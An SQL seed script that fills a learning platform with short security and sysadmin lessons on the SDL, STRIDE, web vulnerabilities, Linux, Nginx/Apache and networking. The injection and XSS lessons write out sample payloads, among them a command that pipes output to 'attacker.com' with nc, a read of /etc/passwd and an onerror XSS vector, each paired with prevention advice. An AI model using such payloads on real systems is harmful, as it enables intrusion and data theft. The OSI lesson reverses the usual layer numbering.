-- Populate lessons for all courses (only where none exist)
-- Each section gets 3 lessons with educational content

-- Product Security Architecture & SDL: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'What is the SDL?', 1,
'## The Security Development Lifecycle

The Security Development Lifecycle (SDL) is a process developed by Microsoft for developing secure software. It integrates security activities into each phase of development.

### Key Phases:
1. **Training** - Security awareness for all team members
2. **Requirements** - Define security requirements and compliance goals
3. **Design** - Threat modeling and attack surface analysis
4. **Implementation** - Use approved tools, review code
5. **Verification** - Dynamic analysis, fuzz testing, security testing
6. **Release** - Final security review, incident response plan
7. **Response** - Security incident response process

### Why SDL Matters
- Reduces vulnerability density by up to 50%
- Lowers cost of fixing security bugs (fixing in design is 100x cheaper than in production)
- Builds customer trust and regulatory compliance
- Creates a culture of security awareness', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'What is the SDL?');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'Threat Modeling with STRIDE', 2,
'## STRIDE Threat Modeling

STRIDE is a mnemonic developed by Microsoft for identifying security threats.

### Categories:
- **S**poofing - Impersonating something or someone (e.g., forging authentication tokens)
- **T**ampering - Modifying data without authorization (e.g., SQL injection)
- **R**epudiation - Denying actions without proof (e.g., missing audit logs)
- **I**nformation Disclosure - Exposing data to unauthorized parties (e.g., verbose error messages)
- **D**enial of Service - Making service unavailable (e.g., resource exhaustion)
- **E**levation of Privilege - Gaining unauthorized access levels (e.g., buffer overflow)

### Process:
1. Create a data flow diagram (DFD)
2. Identify trust boundaries
3. Apply STRIDE to each component
4. Rate threats using DREAD or CVSS
5. Define mitigations for high-risk threats', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Threat Modeling with STRIDE');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe', 'Secure Design Principles', 3,
'## Secure Design Principles

### Core Principles:
1. **Least Privilege** - Grant minimum permissions needed
2. **Defense in Depth** - Multiple layers of security controls
3. **Fail Secure** - Default to deny on failure
4. **Separation of Duties** - No single person controls all steps
5. **Keep It Simple** - Complexity is the enemy of security
6. **Zero Trust** - Never trust, always verify

### Architecture Patterns:
- Input validation at all boundaries
- Parameterized queries to prevent injection
- Output encoding to prevent XSS
- Encryption at rest and in transit
- Secure session management
- Logging and monitoring at every layer', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '6d41e5d7-e086-48ea-b4b5-0a6d6d8a70fe' AND title = 'Secure Design Principles');

-- Advanced Web Vulnerabilities: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'SQL Injection Beyond Basics', 1,
'## Advanced SQL Injection

### Union-Based Injection
Use UNION SELECT to combine results from injected queries.

### Blind SQL Injection
When no error messages are returned:
- **Boolean-based**: Compare responses to true/false conditions
- **Time-based**: Use SLEEP() or WAITFOR DELAY to infer data

### Second-Order Injection
Malicious input is stored and triggered by a different query later. Example: registering with a username containing SQL metacharacters that get executed when an admin views user details.

### Prevention:
- Parameterized queries (always)
- Stored procedures
- Input validation (allowlist)
- WAF rules as defense in depth
- Least privilege DB accounts', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'SQL Injection Beyond Basics');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'OS Command Injection', 2,
'## OS Command Injection

### What It Is
An attacker executes arbitrary OS commands through vulnerable application input fields.

### Common Injection Points:
- ping/traceroute utilities
- File upload processing (filename handling)
- PDF generators with shell commands

### Techniques:
- Direct injection: `; cat /etc/passwd`
- Pipe injection: `ls | nc attacker.com 4444`
- Backtick injection: `` `whoami` ``
- Variable expansion: `${IFS}` to bypass spaces

### Prevention:
- Avoid shell execution entirely (use language-native APIs)
- Input validation (strict allowlist)
- Sandboxing and containerization
- SELinux/AppArmor profiles', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'OS Command Injection');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fbbf55ce-ef86-4270-9284-a84ff143a7a2', 'LDAP and XML Injection', 3,
'## LDAP and XML Injection

### LDAP Injection
Manipulates LDAP queries through user input to bypass authentication or extract data.

### Prevention:
- Escape special LDAP characters
- Use parameterized LDAP queries
- Validate and sanitize all input

### XML Injection / XXE
External Entity Injection allows reading local files, SSRF, and DoS.

### Prevention:
- Disable external entities in XML parsers
- Use JSON instead of XML where possible
- Validate and sanitize XML input
- Use updated parser libraries', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fbbf55ce-ef86-4270-9284-a84ff143a7a2' AND title = 'LDAP and XML Injection');

-- Advanced Web Vulnerabilities: Section 2
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'XSS Exploitation Techniques', 1,
'## Cross-Site Scripting (XSS)

### Types:
1. **Reflected XSS** - Payload in URL/request, reflected in response
2. **Stored XSS** - Payload stored in database, served to all users
3. **DOM-based XSS** - Client-side JavaScript processes unsanitized input

### Advanced Techniques:
- Filter bypass: `<img src=x onerror=alert(1)>`
- Encoding tricks and mutation XSS
- Event handlers: onload, onerror, onfocus

### Impact:
- Session hijacking via cookie theft
- Keylogging and form capture
- Crypto mining in browser

### Defense:
- Content Security Policy (CSP) headers
- Output encoding (context-dependent)
- Input validation (allowlist)
- HttpOnly cookies', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'XSS Exploitation Techniques');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'JWT Security Pitfalls', 2,
'## JWT Security Pitfalls

### Common Vulnerabilities:
1. **None algorithm attack** - Setting alg to "none" to bypass verification
2. **Weak signing keys** - Brute-forceable HMAC secrets
3. **Algorithm confusion** - Using RS256 key as HMAC secret
4. **Missing expiration** - Tokens valid forever
5. **Insecure storage** - Storing in localStorage (XSS risk)

### Best Practices:
- Always validate the algorithm server-side
- Use strong, random signing keys (256+ bits)
- Set short expiration times (15 min access, 7 day refresh)
- Store tokens in HttpOnly, Secure cookies
- Implement token revocation
- Validate all claims (iss, aud, exp, nbf)', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'JWT Security Pitfalls');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '0ec03831-91f5-448f-b90b-d4d327a12a4c', 'Session Management Attacks', 3,
'## Session Management Attacks

### Session Hijacking:
- **Token prediction** - Predictable session IDs
- **Session fixation** - Attacker sets victim session ID
- **Sidejacking** - Sniffing session tokens from network

### Defense:
- Regenerate session ID after login
- Use cryptographically random session IDs
- Bind sessions to IP/User-Agent
- Implement absolute and idle timeouts
- Secure cookie flags: Secure, HttpOnly, SameSite
- CSRF tokens for state-changing operations', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '0ec03831-91f5-448f-b90b-d4d327a12a4c' AND title = 'Session Management Attacks');

-- Advanced Web Vulnerabilities: Section 3
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'IDOR and Access Control Bypass', 1,
'## Insecure Direct Object References (IDOR)

### What It Is
Accessing resources by manipulating object identifiers in API requests.

### Types:
- **Horizontal IDOR** - Access another user at same privilege level
- **Vertical IDOR** - Access admin resources as regular user

### Prevention:
- Use indirect references (UUIDs, slugs)
- Server-side authorization on every request
- Access control middleware
- Log and monitor access patterns', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'IDOR and Access Control Bypass');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'Race Conditions and TOCTOU', 2,
'## Race Conditions

### Time-of-Check to Time-of-Use (TOCTOU)
A vulnerability where the system checks a condition but the state changes before the condition is used.

### Examples:
- Double-spending in payment systems
- Coupon redemption race conditions
- Privilege escalation during state changes

### Prevention:
- Database-level locking (SELECT FOR UPDATE)
- Atomic operations
- Idempotency keys
- Optimistic concurrency control
- Queue-based processing', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Race Conditions and TOCTOU');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5865ab36-6c51-478c-b2da-4815cbc69447', 'Server-Side Request Forgery', 3,
'## Server-Side Request Forgery (SSRF)

### What It Is
An attacker makes the server send requests to internal resources.

### Attack Targets:
- Cloud metadata endpoints (AWS, GCP, Azure)
- Internal services not exposed to internet
- Database servers via admin interfaces

### Techniques:
- Bypass URL parsers with encoded characters
- Use DNS rebinding to reach internal IPs
- Redirect chains to bypass filters

### Prevention:
- URL validation (allowlist)
- Block private/internal IP ranges
- Network segmentation
- Use a dedicated proxy for outbound requests', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5865ab36-6c51-478c-b2da-4815cbc69447' AND title = 'Server-Side Request Forgery');

-- Linux Fundamentals: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'Linux Boot Process', 1,
'## Linux Boot Process

### Stages:
1. BIOS/UEFI - Hardware initialization, POST
2. Bootloader - GRUB loads kernel
3. Kernel - Initializes hardware, mounts root filesystem
4. Init/Systemd - Starts services and daemons
5. Login - Presents login prompt

### Key Commands:
- `dmesg` - View kernel messages
- `systemctl` - Manage systemd services
- `journalctl` - View system logs
- `uptime` - System uptime and load
- `free -h` - Memory usage', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Linux Boot Process');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'File System Navigation', 2,
'## File System Navigation

### Directory Structure:
- `/` Root directory
- `/bin` Essential binaries
- `/etc` System configuration
- `/home` User home directories
- `/var` Variable data (logs, cache)
- `/tmp` Temporary files
- `/proc` Process information (virtual)

### Navigation Commands:
- `pwd` - Print working directory
- `cd /path` - Change directory
- `ls -la` - List files with details
- `find / -name "*.conf"` - Find files
- `tree -L 2` - Directory tree view', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'File System Navigation');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '5ee952ac-4c88-4540-8a95-6793bcbd3c1d', 'Essential Command Line Tools', 3,
'## Essential Command Line Tools

### File Operations:
- `cp source dest` - Copy files
- `mv source dest` - Move/rename
- `rm -rf dir` - Remove files/dirs
- `mkdir -p a/b/c` - Create nested dirs
- `ln -s target link` - Create symlink

### Text Processing:
- `cat file` - Display file
- `less file` - Paginated view
- `head -n 20 file` - First 20 lines
- `tail -f /var/log/syslog` - Follow log
- `grep -rn "pattern" .` - Search recursively
- `sed s/old/new/g` - Stream edit
- `awk {print $1}` - Column extraction

### Piping and Redirection:
- `cmd1 | cmd2` - Pipe output
- `cmd > file` - Redirect stdout
- `cmd >> file` - Append stdout
- `cmd 2>&1` - Redirect stderr', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '5ee952ac-4c88-4540-8a95-6793bcbd3c1d' AND title = 'Essential Command Line Tools');

-- Linux Fundamentals: Section 2
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'User and Group Management', 1,
'## User and Group Management

### Commands:
- `useradd -m -s /bin/bash username` - Create user
- `passwd username` - Set password
- `usermod -aG groupname username` - Add to group
- `userdel -r username` - Delete user
- `id username` - Show user IDs

### Key Files:
- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes
- `/etc/group` - Group definitions

### UID Ranges:
- 0 = Root
- 1-999 = System accounts
- 1000+ = Regular users', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'User and Group Management');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'File Permissions Deep Dive', 2,
'## File Permissions Deep Dive

### Permission Types:
- r (read) = 4 - View content / list directory
- w (write) = 2 - Modify content / create files
- x (execute) = 1 - Run program / enter directory

### Numeric: 755 = rwxr-xr-x

### Special Permissions:
- SUID (4000) - Run as file owner
- SGID (2000) - Run as file group
- Sticky Bit (1000) - Only owner can delete

### Commands:
- `chmod 755 file` - Set numeric permissions
- `chmod u+x script` - Add execute for owner
- `chown user:group file` - Change owner
- `umask 022` - Default permissions mask', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'File Permissions Deep Dive');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '76de84fc-6334-41b4-8149-55a05ea95912', 'sudo and Privilege Escalation', 3,
'## sudo and Privilege Escalation

### sudo Configuration:
Edit `/etc/sudoers` with `visudo`:
- `username ALL=(ALL:ALL) ALL` - Full sudo access
- `%admin ALL=(ALL) NOPASSWD: ALL` - Group, no password

### Privilege Escalation Vectors:
- Misconfigured sudo rules
- SUID binaries
- Writable /etc/passwd
- Kernel exploits
- Cron jobs with weak permissions
- PATH manipulation

### Hardening:
- Least privilege principle
- Audit sudoers regularly
- Log all sudo commands
- Set sudo timeout to 5 minutes', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '76de84fc-6334-41b4-8149-55a05ea95912' AND title = 'sudo and Privilege Escalation');

-- Linux Fundamentals: Section 3
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Bash Scripting Fundamentals', 1,
'## Bash Scripting Fundamentals

### Script Structure:
#!/bin/bash
# Variables
NAME="world"
echo "Hello, $NAME!"

# Command substitution
DATE=$(date +%Y-%m-%d)

# Conditionals
if [ -f "/etc/passwd" ]; then echo "File exists"; fi

# Loops
for i in 1 2 3; do echo "Number: $i"; done

### Exit Codes:
- 0 = Success
- `set -e` = Exit on error
- `set -u` = Error on undefined variable
- `set -o pipefail` = Catch pipe errors', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Bash Scripting Fundamentals');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Text Processing with sed and awk', 2,
'## Text Processing with sed and awk

### sed (Stream Editor):
- `sed s/old/new/g file` - Substitution
- `sed /pattern/d file` - Delete matching lines
- `sed -i s/old/new/g file` - In-place edit
- `sed -n 10,20p file` - Print lines 10-20

### awk:
- `awk {print $1, $3} file` - Print columns
- `awk -F: {print $1} /etc/passwd` - Custom delimiter
- `/error/ {print}` - Filter lines
- `NR == 5` - Line number filter
- Built-in: NR (line num), NF (field count), $0 (entire line)', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Text Processing with sed and awk');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c6827943-9077-4b7f-94bd-e1a5b8d5305c', 'Regular Expressions', 3,
'## Regular Expressions

### Basic Regex:
- `.` Any single character
- `*` Zero or more of preceding
- `+` One or more of preceding
- `^` Start of line
- `$` End of line
- `[]` Character class
- `[^]` Negated class

### Character Classes:
- `[0-9]` Digits
- `[a-z]` Lowercase letters
- `[A-Z]` Uppercase letters

### Practical Examples:
- Email: `^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$`
- IP: `^([0-9]{1,3}\\.){3}[0-9]{1,3}$`
- Date: `^[0-9]{4}-[0-9]{2}-[0-9]{2}$`', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c6827943-9077-4b7f-94bd-e1a5b8d5305c' AND title = 'Regular Expressions');

-- Web Server Administration: Section 1 (Nginx)
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'Nginx Architecture and Configuration', 1,
'## Nginx Architecture

### Architecture:
- Master process - Reads config, manages workers
- Worker processes - Handle requests (as many as CPU cores)
- Event-driven - Non-blocking I/O (epoll on Linux)

### Configuration Structure:
worker_processes auto;
events { worker_connections 1024; }
http {
  server {
    listen 80;
    server_name example.com;
    location / {
      root /var/www/html;
      index index.html;
    }
  }
}

### Key Directives:
- listen, server_name, location
- proxy_pass, upstream, limit_req', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Nginx Architecture and Configuration');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'Reverse Proxy and Load Balancing', 2,
'## Reverse Proxy and Load Balancing

### Reverse Proxy:
- proxy_pass to backend servers
- Set proxy headers (Host, X-Real-IP, X-Forwarded-For)
- WebSocket support with Upgrade headers

### Load Balancing Algorithms:
- Round-robin (default)
- Least connections (least_conn)
- IP hash (ip_hash) for session affinity
- Weighted (weight parameter)

### Health Checks:
- max_fails and fail_timeout
- Backup servers for failover', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'Reverse Proxy and Load Balancing');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9e518831-5103-4e4a-9944-6deefdc7465f', 'SSL/TLS Configuration', 3,
'## SSL/TLS Configuration

### SSL Setup:
- ssl_certificate and ssl_certificate_key
- Modern TLS: ssl_protocols TLSv1.2 TLSv1.3
- OCSP Stapling for performance
- HSTS header: Strict-Transport-Security

### Security Headers:
- X-Frame-Options DENY
- X-Content-Type-Options nosniff
- Content-Security-Policy

### Let's Encrypt:
- certbot --nginx -d example.com
- Auto-renewal with cron', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9e518831-5103-4e4a-9944-6deefdc7465f' AND title = 'SSL/TLS Configuration');

-- Web Server Administration: Section 2 (Apache)
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Apache Configuration Basics', 1,
'## Apache Configuration

### Virtual Hosts:
<VirtualHost *:80>
  ServerAdmin admin@example.com
  DocumentRoot /var/www/html
</VirtualHost>

### Modules:
- a2enmod / a2dismod for enable/disable
- a2ensite / a2dissite for sites

### Apache vs Nginx:
- Apache: Process/thread model, .htaccess support
- Nginx: Event-driven, better for static files, lower memory', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Apache Configuration Basics');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Security Hardening', 2,
'## Apache Security Hardening

### Hide Server Version:
ServerTokens Prod
ServerSignature Off

### Disable Unnecessary Modules:
a2dismod autoindex, status, info

### Access Control:
- IP-based: Require ip 10.0.0.0/8
- Authentication: AuthType Basic

### Security Headers:
- X-Content-Type-Options nosniff
- X-Frame-Options DENY
- X-XSS-Protection
- HSTS header', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Security Hardening');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '70027b0b-5833-4a93-80a1-b6ef042bfcc7', 'Performance Tuning', 3,
'## Apache Performance Tuning

### MPM Configuration:
- Event MPM (recommended)
- Tune StartServers, MaxRequestWorkers

### Caching:
- mod_expires for browser caching
- mod_headers for cache headers

### Compression:
- mod_deflate for gzip

### Monitoring:
- apachectl status (mod_status)
- ab for benchmarking', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '70027b0b-5833-4a93-80a1-b6ef042bfcc7' AND title = 'Performance Tuning');

-- Web Server Administration: Section 3
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Deploying Node.js Applications', 1,
'## Deploying Node.js Applications

### Process Management with PM2:
- pm2 start app.js --name myapp
- pm2 startup and pm2 save
- Cluster mode: pm2 start app.js -i max

### Nginx + PM2:
- Reverse proxy to localhost:3000
- WebSocket support headers
- Proxy buffering off for SSE

### Deployment Checklist:
- Environment variables set
- SSL certificate installed
- PM2 configured for auto-restart
- Log rotation configured
- Monitoring enabled', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Deploying Node.js Applications');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Containerized Deployment', 2,
'## Containerized Deployment

### Dockerfile Best Practices:
- Multi-stage builds
- alpine base images
- npm ci --production
- Non-root USER directive

### Docker Compose Production:
- restart: always
- Resource limits (memory, cpus)
- Health checks
- Volume mounts for persistence

### CI/CD Pipeline:
- Build and test
- Build Docker image
- Push to registry
- Deploy to server
- Health check verification', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Containerized Deployment');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52', 'Zero-Downtime Deployments', 3,
'## Zero-Downtime Deployments

### Blue-Green Deployment:
1. Deploy new version to inactive environment
2. Run smoke tests
3. Switch traffic to new version
4. Keep old version for rollback

### Rolling Updates:
- Gradually shift traffic weight
- Monitor error rates during transition

### Database Migrations:
- Write backward-compatible migrations
- Add column before deploying code that uses it
- Feature flags for new functionality

### Rollback:
- pm2 deploy production revert 1
- Docker: use previous tag
- nginx -s reload after config change', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'bae07d17-4da6-4a9c-9a6f-d911ed8a0c52' AND title = 'Zero-Downtime Deployments');

-- Networking: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'OSI Model and TCP/IP', 1,
'## OSI Model and TCP/IP Stack

### 7-Layer OSI Model:
1. Application - HTTP, DNS, SMTP
2. Presentation - SSL/TLS
3. Session - NetBIOS, RPC
4. Transport - TCP, UDP
5. Network - IP, ICMP
6. Data Link - Ethernet, ARP
7. Physical - Cables

### TCP Three-Way Handshake:
1. SYN, 2. SYN-ACK, 3. ACK

### Common Ports:
- 22 SSH, 80 HTTP, 443 HTTPS
- 3306 MySQL, 5432 PostgreSQL, 6379 Redis', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'OSI Model and TCP/IP');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'Subnetting and CIDR', 2,
'## Subnetting and CIDR

### CIDR Notation:
- /24 = 256 hosts
- /25 = 128 hosts, /26 = 64, /27 = 32, /28 = 16

### Private IP Ranges:
- 10.0.0.0/8
- 172.16.0.0/12
- 192.168.0.0/16

### Formula:
Usable IPs = 2^(32-mask) - 2', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'Subnetting and CIDR');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf', 'DNS and Name Resolution', 3,
'## DNS and Name Resolution

### Record Types:
- A (IPv4), AAAA (IPv6), CNAME (alias)
- MX (mail), TXT (text/SPF/DKIM), NS, SOA

### Resolution Process:
Browser cache > OS cache > Router > ISP DNS > Root > TLD > Authoritative

### Tools:
- dig, nslookup, host, dig +trace', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'b8d8d69a-db1a-4222-87d4-1b5d3fec9dcf' AND title = 'DNS and Name Resolution');

-- Networking: Section 2
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'Firewall Types and Configuration', 1,
'## Firewalls

### Types:
- Packet filtering (stateless)
- Stateful inspection
- Application layer (WAF)
- Next-gen (NGFW)

### iptables:
- Default policies: INPUT DROP, FORWARD DROP
- Allow established: -m state --state ESTABLISHED,RELATED
- Rate limiting: -m connlimit --connlimit-above 3

### nftables (modern replacement):
- Tables, chains, rules
- Better performance than iptables', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Firewall Types and Configuration');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'VPN Technologies', 2,
'## VPN Technologies

### Types:
- Site-to-Site, Remote Access, Client-to-Site

### WireGuard (Modern):
- Simple config: Interface + Peer sections
- ChaCha20 encryption, Curve25519 keys

### OpenVPN:
- Certificate-based or username/password
- TCP or UDP transport
- TLS encryption

### Security:
- Strong encryption (AES-256)
- Kill switch, PFS
- Regular key rotation', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'VPN Technologies');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '16b83718-c1c5-4e49-b36c-27f6494ba6ea', 'Network Address Translation', 3,
'## NAT

### Types:
- Static NAT (one-to-one)
- Dynamic NAT (pool)
- PAT (port address translation, many-to-one)

### iptables NAT:
- MASQUERADE for internet access
- DNAT for port forwarding
- Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '16b83718-c1c5-4e49-b36c-27f6494ba6ea' AND title = 'Network Address Translation');

-- Networking: Section 3
